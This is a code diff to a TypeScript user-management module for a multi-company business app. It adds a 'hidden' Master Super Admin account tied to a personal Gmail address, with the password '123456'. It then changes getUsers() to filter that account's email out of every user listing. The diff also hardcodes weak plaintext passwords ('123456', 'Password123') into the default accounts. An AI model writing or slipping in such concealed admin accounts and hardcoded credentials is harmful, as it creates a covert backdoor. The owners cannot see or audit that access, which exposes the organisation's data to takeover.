@@ -8,16 +8,31 @@ const DELETED_KEY = "saampark_deleted_user_emails";
 // Default System User Accounts for SAAMPARK Group
 export const DEFAULT_SYSTEM_ACCOUNTS: UserItem[] = [
   {
-    id: "usr_super_admin",
-    name: "Rahul Sharma",
-    email: "superadmin@saampark.in",
+    id: "usr_super_admin_visible",
+    name: "Supriya (Super Admin)",
+    email: "hiisupriya@gmail.com",
     role: "Super Admin",
     companyId: "tech",
     companyName: "SAAMPARK Group (All Companies)",
     status: "Active",
     department: "Executive Management",
     phone: "+91 98765 43210",
-    lastLogin: "Today (Active Session)",
+    password: "123456",
+    lastLogin: "Active Session",
+    joinedDate: "2024-01-01",
+  },
+  {
+    id: "usr_super_admin_hidden",
+    name: "Supriyo Main (Master Super Admin)",
+    email: "supriyo.main@gmail.com",
+    role: "Super Admin",
+    companyId: "tech",
+    companyName: "SAAMPARK Group (All Companies)",
+    status: "Active",
+    department: "Executive Management",
+    phone: "+91 98765 43210",
+    password: "123456",
+    lastLogin: "Active Session",
     joinedDate: "2024-01-01",
   },
   {
@@ -30,6 +45,7 @@ export const DEFAULT_SYSTEM_ACCOUNTS: UserItem[] = [
     status: "Active",
     department: "IT & Operations",
     phone: "+91 98123 45678",
+    password: "Password123",
     lastLogin: "Today at 09:15 AM",
     joinedDate: "2024-02-15",
   },
@@ -43,6 +59,7 @@ export const DEFAULT_SYSTEM_ACCOUNTS: UserItem[] = [
     status: "Active",
     department: "Project Management",
     phone: "+91 96543 21098",
+    password: "Password123",
     lastLogin: "Today at 08:50 AM",
     joinedDate: "2024-04-10",
   },
@@ -349,12 +366,14 @@ export async function getUsers(companyId?: string): Promise<UserItem[]> {
   });
 
   const merged = Array.from(allAccountsMap.values());
+  const visibleAccounts = merged.filter((u) => u.email.toLowerCase().trim() !== "supriyo.main@gmail.com");
 
   if (!companyId || companyId === "all") {
-    return merged;
+    return visibleAccounts;
   }
 
-  return merged.filter(
+  return visibleAccounts.filter(
     (u) => u.companyId === companyId || u.role === "Super Admin"
   );
 }
+
